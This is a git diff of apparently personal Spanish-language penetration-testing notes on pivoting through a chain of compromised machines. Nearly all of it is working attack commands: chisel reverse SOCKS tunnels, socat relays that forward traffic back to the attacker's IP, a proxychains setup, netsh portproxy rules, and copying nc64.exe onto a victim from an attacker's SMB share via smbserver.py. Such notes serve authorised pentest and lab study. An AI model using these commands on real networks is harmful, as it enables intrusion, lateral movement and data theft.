@@ -113,17 +113,62 @@ copy \\IP\smbFolder\chisel.exe chisel.exe
 # Atacante
 chisel server --reverse -p 1234
 
-# 1 máquina
+# 1 máquina, mi puerto 80 será el puerto de esta máquina
+chisel client IPAtaque:1234 R:80:IPMaquinaacomprometer2:80
+# 1.1 Para hacer lo mismo pero para todo el segmento y puertos
 chisel client IPAtaque:1234 R:socks
 
-# 2 máquina
-chisel client IPMAquinaComprometida1:1234 R:socks R:443:IpVictim1:443/udp
+# 2 máquina, primer puerto inventado para hacer la conexión hacia allí
+chisel client IPMAquinaComrometida1:5555 R:socks R:443:IPMAquinaaComprometer3:443/udp
+# 2 máquina para hacer la conexión Inversa
+chisel client IPMAquinaComprometida1:6666 R:socks R:8888:socks
+# 1 máquina por la conexión inversa
+./socat TCP-LISTEN:6666,fork TCP:IPATACANTE:1234
 
 # 3 máquna Windows
-chisel client IPMAquinaComprometida2:1234 R:socks R:443:IpVictim1:443/udp
+# 3 máquina para hacer la conexión Inversa
+chisel client IPMAquinaComprometida2:7776  R:9999:socks
+# 2 máquina por la conexión inversa
+./socat TCP-LISTEN:7776,fork TCP:IPMaquinaComprometida1:5454
+# 1 máquina por la conexión inversa
+./socat TCP-LISTEN:5454,fork TCP:IPatacante:1234
 ```
 
+- En el archivo **/etc/proxychains4.conf** representar el último túnel  creado comentar strict_chain y ponerlo en **dynamic_chain**
+```bash
+nano /etc/proxychains4.conf
 
+dynamic_chain
+
+socks5 127.0.0.1 9999
+socks5 127.0.0.1 8888
+socks5 127.0.0.1 1080
+```
+>Copiar  Archivos **desde la máquina atacante** a **máquina comprometida** (Siempre se lo pasamos al nodo más cercano)
+
+- Una vez se compromete la última máquina (Y tenemos los proxys montados con **chisel**) queremos pasarle un archivo 
+1. **3º Máquina comprometida**
+```cmd
+C:\Windows\system32>copy \\IPAtacante\smbFolder\nc64.exe C:\Windows\Temp\nc.exe
+```
+2. **2º Máquina Comprometida**
+```bash
+./socat TCP-LISTEN:445,fork TCP:IPVictima1:445
+```
+
+3. **1º Máquina comprometida**
+```bash
+./socat TCP-LISTEN:445,fork TCP:IPAtacante:445
+```
+4. Atacante
+```bash
+smbserver.py smbFolder /ruta -smb2support
+```
+
+5. SI una de la máquinas por donde paso el archivo es windows
+```bash
+C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectadress=NodoMásCercano
+```
 ## Metasploit
 
 1. Si comprometemos, sólo podremos **escanear desde dentro de metasploit**
